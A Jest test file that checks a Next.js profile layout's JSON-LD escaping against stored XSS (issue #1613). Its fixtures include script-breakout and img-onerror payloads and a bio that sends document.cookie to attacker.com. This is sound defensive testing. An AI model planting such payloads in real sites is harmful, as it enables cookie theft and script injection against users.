import React from "react";
import { render } from "@testing-library/react";
import { safeJsonLd } from "@/lib/security/json-ld";

// Mock dependencies for app/[username]/layout
jest.mock("@vercel/postgres", () => ({
  sql: jest.fn(),
}));

jest.mock("next/cache", () => ({
  unstable_cache: (fn: any) => fn,
}));

jest.mock("@/app/[username]/UsernameLayoutClient", () => {
  return function MockUsernameLayoutClient({ children }: { children: React.ReactNode }) {
    return <div data-testid="client-layout">{children}</div>;
  };
});

import { sql } from "@vercel/postgres";
import UsernameLayout from "@/app/[username]/layout";

const sqlMock = sql as unknown as jest.Mock;

describe("Security Issue #1613: Stored XSS prevention in JSON-LD script tags", () => {
  describe("safeJsonLd utility", () => {
    it("escapes script-closing tags to prevent HTML script breakout", () => {
      const payload = {
        bio: "</script><script>alert('xss')</script>",
      };

      const serialized = safeJsonLd(payload);

      // Must not contain raw literal </script> or <script>
      expect(serialized).not.toContain("</script>");
      expect(serialized).not.toContain("<script>");
      expect(serialized).toContain("\\u003c/script\\u003e");
      expect(serialized).toContain("\\u003cscript\\u003e");

      // When parsed by a JSON parser (as Schema.org scrapers and browsers do), original data is preserved
      const parsed = JSON.parse(serialized);
      expect(parsed.bio).toBe("</script><script>alert('xss')</script>");
    });

    it("escapes HTML comments and entity characters", () => {
      const payload = {
        title: "<!-- <test> & 'quote' -->",
      };

      const serialized = safeJsonLd(payload);
      expect(serialized).not.toContain("<");
      expect(serialized).not.toContain(">");
      expect(serialized).not.toContain("&");
      expect(serialized).toContain("\\u003c");
      expect(serialized).toContain("\\u003e");
      expect(serialized).toContain("\\u0026");

      const parsed = JSON.parse(serialized);
      expect(parsed.title).toBe("<!-- <test> & 'quote' -->");
    });
  });

  describe("UsernameLayout JSON-LD rendering", () => {
    it("ensures malicious user bio and stream title cannot break out of JSON-LD script tags", async () => {
      const maliciousBio = `Nice bio </script><script data-injected="true">document.location='http://attacker.com/?cookie='+document.cookie</script>`;
      const maliciousTitle = `StreamTitle</script><img src=x onerror=alert(1)>`;

      sqlMock.mockResolvedValueOnce({
        rows: [
          {
            username: "attacker_user",
            avatar: "https://example.com/avatar.jpg",
            bio: maliciousBio,
            is_live: true,
            creator: {
              streamTitle: maliciousTitle,
            },
            mux_playback_id: "test-playback-id-123",
            stream_started_at: "2026-09-25T10:00:00Z",
          },
        ],
      });

      const paramsPromise = Promise.resolve({ username: "attacker_user" });
      const jsx = await UsernameLayout({
        children: <span>Profile Content</span>,
        params: paramsPromise,
      });

      const { container } = render(jsx);

      // Query all ld+json scripts
      const scripts = container.querySelectorAll('script[type="application/ld+json"]');
      expect(scripts.length).toBe(2); // personSchema and videoSchema

      scripts.forEach(script => {
        const rawContent = script.innerHTML;
        // Verify that the literal closing script tag does not appear unescaped in script content
        expect(rawContent).not.toMatch(/<\/script>/i);
        expect(rawContent).not.toMatch(/<script/i);

        // Verify it is valid JSON
        expect(() => JSON.parse(rawContent)).not.toThrow();
        const parsed = JSON.parse(rawContent);
        if (parsed["@type"] === "Person") {
          expect(parsed.description).toBe(maliciousBio);
        } else if (parsed["@type"] === "VideoObject") {
          expect(parsed.name).toBe(maliciousTitle);
        }
      });
    });
  });
});
